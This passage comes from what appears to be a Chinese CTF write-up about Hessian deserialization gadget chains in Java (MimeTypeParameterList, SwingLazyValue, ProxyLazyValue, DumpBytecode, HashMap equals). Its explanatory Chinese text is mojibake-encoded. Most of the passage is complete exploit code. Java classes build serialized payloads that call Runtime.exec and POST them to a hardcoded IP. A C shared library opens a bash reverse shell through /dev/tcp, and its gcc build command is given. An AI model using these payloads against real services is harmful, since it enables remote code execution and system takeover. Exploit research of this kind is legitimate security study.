title="MimeTypeParameterList&#x3D;&gt;MethodUtil.invoke"></a>MimeTypeParameterList&#x3D;&gt;MethodUtil.invoke</h3><p>èµ·ç‚¹<code>javax.activation.MimeTypeParameterList#toString</code></p><p><a href="https://imgse.com/i/pCJC3TI"><img src="https://s1.ax1x.com/2023/06/21/pCJC3TI.png" alt="pCJC3TI.png"></a></p><p><code>this.parameters</code>è°ƒç”¨äº†getï¼ŒåŒæ—¶parametersæ˜¯ä¸€ä¸ªHashtable</p><p>å¾€ååŒæ ·æ‰¾ä¸€ä¸ªé™æ€æ–¹æ³•<code>sun.reflect.misc.MethodUtil#invoke</code></p><p><a href="https://imgse.com/i/pCJCjnH"><img src="https://s1.ax1x.com/2023/06/21/pCJCjnH.png" alt="pCJCjnH.png"></a></p><p>è¿™é‡Œå¯¹invokeè¿›è¡Œäº†ä¸¤æ¬¡è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡å°±èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodUtilExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://81.70.221.206:8090/&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(obj);</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>).getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invokeMethod, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;aaa&quot;</span>, slz);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(mimeTypeParameterList,<span class="string">&quot;parameters&quot;</span>,uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(mimeTypeParameterList);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doPOST(baos.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MimeTypeParameterList-x3D-gt-System-load"><a href="#MimeTypeParameterList-x3D-gt-System-load" class="headerlink" title="MimeTypeParameterList &#x3D;&gt; System.load"></a>MimeTypeParameterList &#x3D;&gt; System.load</h3><p>èµ·ç‚¹è¿˜æ˜¯<code>javax.activation.MimeTypeParameterList#toString</code></p><p>æœ€åæ‰¾åˆ°çš„é™æ€æ–¹æ³•<code>jdk.nashorn.internal.codegen.DumpBytecode#dumpBytecode</code>,å‚æ•°å¯æ§ï¼Œå¯ä»¥å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œå¯é…åˆsystem.loadæ‰“ç»„åˆæ‹³</p><p><a href="https://imgse.com/i/pCJlnaV"><img src="https://s1.ax1x.com/2023/06/22/pCJlnaV.png" alt="pCJlnaV.png"></a></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯å› ä¸ºclassLoaderåŠ è½½çš„åŸå›  ï¼Œåœ¨SwingLazyValueè¿™é‡Œåªèƒ½è¿›è¡ŒåŠ è½½<code>rt.jar</code>é‡Œé¢çš„ç±»,è€Œ<code>jdk.nashorn.internal.codegen.DumpBytecode.dumpBytecode</code>å±äº<code>nashorn.jar</code> ,å¯¼è‡´æ— æ³•è¿›è¡ŒåŠ è½½<br>åé¢æ˜¯æ‰¾åˆ°äº†<code>javax.swing.ProxyLazyValue#createValue</code></p><p><a href="https://imgse.com/i/pCJrtcn"><img src="https://s1.ax1x.com/2023/06/22/pCJrtcn.png" alt="pCJrtcn.png"></a></p><p>é€šè¿‡è¿™é‡Œè·å–åˆ°çš„classloader ï¼Œç„¶åå°±å¯æ­£å¸¸åŠ è½½nashorn.jar</p><p>è¿˜æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šåœ¨Hessianåºåˆ—åŒ–æ—¶ï¼ŒProxyLazyValueé‡Œçš„<code>fieldï¼šacc</code> åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ ï¼Œæ‰€ä»¥éœ€è¦å°†accç½®ä¸ºç©º</p><p>éšåæ¯”è¾ƒç®€å•äº†ï¼Œç”¨DumpBytecode.dumpBytecodeåˆ›å»ºåŠ¨æ€é“¾æ¥åº“ï¼Œç„¶åç”¨System.loadæ‰§è¡Œ</p><p><strong>exp.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((__constructor__))  calc ()&#123;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c myexp.c -o myexp.o -fPIC &amp;&amp; gcc myexp.o -shared -o myexp.so</span><br></pre></td></tr></table></figure><p>Exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://81.70.221.206:8090/&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(obj);</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> unsafe.allocateInstance(ScriptEnvironment.class);</span><br><span class="line">        setFieldValue(script,<span class="string">&quot;_dest_dir&quot;</span>,<span class="string">&quot;/tmp/&quot;</span>);</span><br><span class="line">        Object debug=unsafe.allocateInstance(DebugLogger.class);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\myexp.so&quot;</span>));</span><br><span class="line">        String classname=<span class="string">&quot;myexp&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>, <span class="string">&quot;dumpBytecode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        setFieldValue(proxyLazyValue,<span class="string">&quot;acc&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;key&quot;</span>, proxyLazyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.awt.datatransfer.MimeTypeParameterList&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> unsafe.allocateInstance(clazz);</span><br><span class="line">        setFieldValue(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(mimeTypeParameterList);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doPOST(baos.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h2><p>èµ°Hessianæ­£å¸¸ååºåˆ—åŒ–çš„Hashtable.equalså…¥å£ï¼Œæ¥ä¸Šäº†UIDefaultsçš„ååŠæ®µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> javax.swing.UIDefaults;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://81.70.221.206:8090/&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(obj);</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>).getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invokeMethod, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;command&quot;</span>&#125;&#125;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults1.put(<span class="string">&quot;_&quot;</span>, slz);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults2.put(<span class="string">&quot;_&quot;</span>, slz);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(uiDefaults1,uiDefaults2);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doPOST(baos.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 